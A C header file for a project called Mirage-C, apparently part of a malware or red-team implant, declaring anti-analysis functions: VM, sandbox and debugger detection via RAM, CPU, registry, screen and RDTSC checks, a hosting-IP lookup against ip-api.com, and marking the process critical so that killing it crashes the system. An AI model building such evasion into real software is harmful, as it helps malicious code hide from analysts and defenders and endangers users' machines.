/*
 * evasion.h — Low-level evasion check primitives for Mirage-C
 *
 * Direct translation of Zig src/evasion/evasion.zig.
 * Provides: RAM, CPU core count, debugger, screen, registry VM checks,
 * timing anomaly, hosting IP detection.
 */

#ifndef MIRAGE_EVASION_H
#define MIRAGE_EVASION_H

#include "nt_types.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ── Screen resolution result ────────────────────────────── */
typedef struct {
    uint32_t w;
    uint32_t h;
} mirage_screen_res;

/*
 * getTotalPhysicalRam — Query total physical RAM via NtQuerySystemInformation.
 * Returns total bytes, or 0 on failure.
 */
uint64_t mirage_get_total_physical_ram(void);

/*
 * getCpuCoreCount — Query processor count via NtQuerySystemInformation.
 * Returns number of processors, or 0 on failure.
 */
uint8_t mirage_get_cpu_core_count(void);

/*
 * checkDebugger — Query ProcessDebugPort via NtQueryInformationProcess.
 * Returns 1 if debugger detected, 0 otherwise.
 */
int mirage_check_debugger(void);

/*
 * checkRegistryVmIndicators — Check BIOS registry for VM manufacturer/product.
 * Returns 1 if VM indicators found, 0 otherwise.
 */
int mirage_check_registry_vm_indicators(void);

/*
 * checkScreenResolution — Get screen dimensions via NtUserGetSystemMetrics.
 * Returns screen resolution, or {0,0} on failure.
 */
mirage_screen_res mirage_check_screen_resolution(void);

/*
 * checkTimingAnomaly — RDTSC-based timing check against VM_TIMING_ANOMALY_TSC.
 * Returns 1 if timing anomaly detected, 0 otherwise.
 */
int mirage_check_timing_anomaly(void);

/*
 * setBreakOnTermination — Set ProcessBreakOnTermination on current process.
 * Returns 1 on success, 0 on failure.
 */
int mirage_set_break_on_termination(int enable);

/*
 * checkHostingIP — Query ip-api.com to check if IP is a hosting provider.
 * Returns 1 if hosting, 0 if not, -1 on error.
 */
int mirage_check_hosting_ip(void);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_EVASION_H */
